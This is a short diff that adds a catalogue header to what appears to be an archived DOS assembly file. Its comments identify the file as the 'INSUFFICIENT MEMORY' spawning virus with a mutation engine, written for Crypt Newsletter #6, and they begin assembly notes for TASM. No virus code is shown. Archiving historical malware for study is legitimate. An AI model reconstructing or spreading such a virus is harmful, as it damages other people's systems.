@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      I
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ;INSUFFICIENT MEMORY virus - by URNST KOUCH for Crypt Newsletter #6
 ;INSUFF MEMO is a simple MUTATION ENGINE loaded spawning virus, which 
 ;confines itself to the current directory. To assemble with TASM 2.5, user
